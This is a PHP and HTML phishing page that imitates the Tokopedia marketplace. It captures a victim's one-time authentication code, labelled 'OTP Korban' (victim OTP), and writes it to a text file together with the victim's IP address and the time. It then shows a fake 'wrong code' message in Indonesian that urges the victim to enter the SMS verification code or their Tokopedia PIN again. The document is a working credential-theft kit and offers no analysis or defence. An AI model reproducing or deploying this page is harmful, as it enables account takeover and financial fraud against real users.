<?php
$file = "99.txt";
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$henpon = $_POST['hp'];


/* OTP Korban */

$handle = fopen($file, 'a');
fwrite($handle, "===== Kode Otentikasi =====");
fwrite($handle, "\n");
fwrite($handle, "Kode Otentikasi: ");
fwrite($handle, "$henpon");
fwrite($handle, "\n");
fwrite($handle, "IP Address: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "===== Terima Kasih =====");
fwrite($handle, "\n");
fclose($handle);
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
<title>tokopedia.com</title>

<link rel="icon" type="image/png" sizes="512x512" href="https://ecs7.tokopedia.net/assets-tokopedia-lite/prod/icon512.png">


</script>

<link rel="stylesheet" media="screen" href="https://s2.bukalapak.com/ast/mobile-378729e0f3759ca18e27c649519ffecdeba86f84748a1d8f8f31b96a7e31e043.css" />
</head>
<body class='focus new-a user_sessions-c' data-current-user='' data-session-id='e5e75f23d6e64ebf7a0ce98431774078'>
<script>
  _atrk_opts = { atrk_acct:"4Fkbi1aoZM00Ua", domain:"bukalapak.com",dynamic: true};
  (function() { var as = document.createElement('script'); as.type = 'text/javascript'; as.async = true; as.src = "https://d31qbv1cthcecs.cloudfront.net/atrk.js"; var s = document.getElementsByTagName('script')[0];s.parentNode.insertBefore(as, s); })();
</script>
<noscript>
<img src="https://d5nxst8fruw4z.cloudfront.net/atrk.gif?account=4Fkbi1aoZM00Ua" style="display:none" height="1" width="1" alt="" />
</noscript>

<div class='js-external-services' data-client-id='ecda303ff7dbdc7aa38491d8' data-url-accounts='https://accounts.bukalapak.com' data-url-api='https://api.shopee.co.id' data-url-omniscience='https://shopee.co.id/omniscience/v2'></div>

<form class="js-secure-client" data-api-url="https://api.shopee.co.id" action="https://shopee.co.id/auth_proxies/request_token" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="Mi+HmPJIZqQyGZv6pvIgPycEhCTnIltkTSdH5KfwxgcGHKArGm4VOsz49IKuYRcLzZDHunM2I2Gp1xnahCOVLg==" />
<input type="hidden" name="application_id" id="application_id" value="ecda303ff7dbdc7aa38491d8" />
<input type="submit" name="commit" value="submit" class="u-hidden hidden" />
</form>


<div class='flash-container js-flash-container'>
</div>

<div id='wrapper'>
<header class='clearfix' id='page_header' role='banner'>

<h3 class='/'</h3>

<h3><center> <img src="https://ecs7.tokopedia.net/assets-tokopedia-lite/v2/zeus/production/e5b8438b.svg" width:"100%" class="img-fluid"></center> </h3>
</header>
<br>
<hr>
</div>
<h3><center><b>Kode yang anda masukkan salah</center></h3>
<p><center><b>Silahkan Gunakan Kode Verifikasi Yang Ada Di Sms Atau Gunakan PIN Tokopedia</center></p>
<br>
<br>
<p>
<center><img alt=" Failed " src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/Deletion_icon.svg/620px-Deletion_icon.svg.png" width:"100%" />
</center></p>
<div id='page'>
<h6><center><a <a class='btn btn--green btn--medium btn--block' href='/index.php'>Silahkan Di Coba Kembali</a></center></h6>
</div>
</body>
</html>
